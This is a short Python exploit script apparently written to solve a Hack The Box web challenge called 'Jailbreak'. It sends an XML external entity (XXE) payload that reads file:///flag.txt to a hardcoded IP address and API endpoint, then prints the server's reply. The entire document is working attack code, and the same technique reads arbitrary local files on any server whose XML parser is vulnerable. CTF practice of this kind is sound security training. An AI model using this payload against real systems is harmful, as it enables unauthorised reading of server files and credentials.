#!/usr/bin/env python3
"""Jailbreak - HTB Try Out Web challenge exploit (XXE)"""
import requests

URL = "http://154.57.164.73:31701/api/update"

payload = """<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>&xxe;</Version>
    <ReleaseDate>2077-10-21</ReleaseDate>
  </Firmware>
</FirmwareUpdateConfig>"""

r = requests.post(URL, data=payload, headers={"Content-Type": "application/xml"})
print(r.status_code)
print(r.text)
